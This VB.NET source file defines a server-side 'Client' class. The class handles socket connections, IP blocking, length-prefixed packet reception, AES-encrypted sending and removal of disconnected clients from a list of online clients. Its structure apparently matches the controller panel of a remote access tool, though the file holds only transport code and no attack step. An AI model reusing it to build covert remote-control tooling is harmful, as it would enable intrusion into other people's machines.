Imports System.IO
Imports System.Net.Sockets


Public Class Client

    Public ClientSocket As Socket = Nothing
    Public IsConnected As Boolean = False
    Public BufferLength As Long = Nothing
    Public BufferLengthReceived As Boolean = False
    Public Buffer() As Byte = Nothing
    Public MS As MemoryStream = Nothing
    Public IP As String = Nothing
    Public LV As ListViewItem = Nothing
    Public SendSync As Object = Nothing
    Public ID As String = Nothing

    Sub New(ByVal CL As Socket)

        ClientSocket = CL
        ClientSocket.ReceiveBufferSize = 50 * 1024
        ClientSocket.SendBufferSize = 50 * 1024
        IsConnected = True
        BufferLength = -1
        Buffer = New Byte(0) {}
        MS = New MemoryStream
        IP = CL.RemoteEndPoint.ToString
        SendSync = New Object()
        If Settings.Blocked.Contains(IP.Split(":")(0)) Then
            isDisconnected()
            Return
        Else
            ClientSocket.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
        End If

    End Sub

    Async Sub BeginReceive(ByVal ar As IAsyncResult)
        If Not IsConnected OrElse Not ClientSocket.Connected Then
            isDisconnected()
            Return
        End If
        Try
            Dim Received As Integer = ClientSocket.EndReceive(ar)
            If Received > 0 Then
                If BufferLength = -1 Then
                    If Buffer(0) = 0 Then
                        BufferLength = BS(MS.ToArray)
                        MS.Dispose()
                        MS = New MemoryStream

                        If BufferLength = 0 Then
                            BufferLength = -1
                            ClientSocket.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), ClientSocket)
                        End If
                        Buffer = New Byte(BufferLength - 1) {}
                    Else
                        Await MS.WriteAsync(Buffer, 0, Buffer.Length)
                    End If
                Else
                    Await MS.WriteAsync(Buffer, 0, Received)
                    If (MS.Length = BufferLength) Then
                        Dim ClientReq As New Incoming_Requests(Me, MS.ToArray)
                        Pending.Req_In.Add(ClientReq)
                        Settings.Received += MS.Length
                        BufferLength = -1
                        MS.Dispose()
                        MS = New MemoryStream
                        Buffer = New Byte(0) {}
                    Else
                        Buffer = New Byte(BufferLength - MS.Length - 1) {}
                    End If
                End If
            Else
                isDisconnected()
                Return
            End If
            ClientSocket.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), ClientSocket)
        Catch ex As Exception
            Debug.WriteLine("BeginReceive " + ex.Message)
            isDisconnected()
            Return
        End Try
    End Sub

    Async Sub BeginSend(ByVal Data As Byte())
        SyncLock SendSync
            If Not IsConnected OrElse Not ClientSocket.Connected Then
                isDisconnected()
                Exit Sub
            End If
            Try
                Using MS As New MemoryStream
                    Dim b As Byte() = AES_Encryptor(Data)
                    Dim L As Byte() = SB(b.Length & CChar(vbNullChar))
                    MS.Write(L, 0, L.Length)
                    MS.Write(b, 0, b.Length)

                    ClientSocket.Poll(-1, SelectMode.SelectWrite)
                    ClientSocket.BeginSend(MS.ToArray, 0, MS.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), Nothing)
                    Settings.Sent += MS.Length
                End Using
            Catch ex As Exception
                Debug.WriteLine("BeginSend " + ex.Message)
                isDisconnected()
            End Try
        End SyncLock
    End Sub

    Sub EndSend(ByVal ar As IAsyncResult)
        Try
            ClientSocket.EndSend(ar)
        Catch ex As Exception
            Debug.WriteLine("EndSend " + ex.Message)
            isDisconnected()
        End Try
    End Sub

    Delegate Sub _isDisconnected()
    Sub isDisconnected()

        IsConnected = False

        Try
            If LV IsNot Nothing Then
                If Messages.F.Lv1.InvokeRequired Then
                    Messages.F.Lv1.BeginInvoke(New _isDisconnected(AddressOf isDisconnected))
                    Exit Sub
                Else
                    LV.Remove()
                    log(IP.Split(":")(0), False)
                    Settings.Online.Remove(Me)
                End If
            End If
        Catch ex As Exception
            Debug.WriteLine("L.Remove " + ex.Message)
        End Try

        Try
            ClientSocket.Close()
            ClientSocket.Dispose()
        Catch ex As Exception
            Debug.WriteLine("C.Close " + ex.Message)
        End Try

        Try
            MS.Dispose()
        Catch ex As Exception
            Debug.WriteLine("MS.Dispose " + ex.Message)
        End Try

    End Sub

End Class
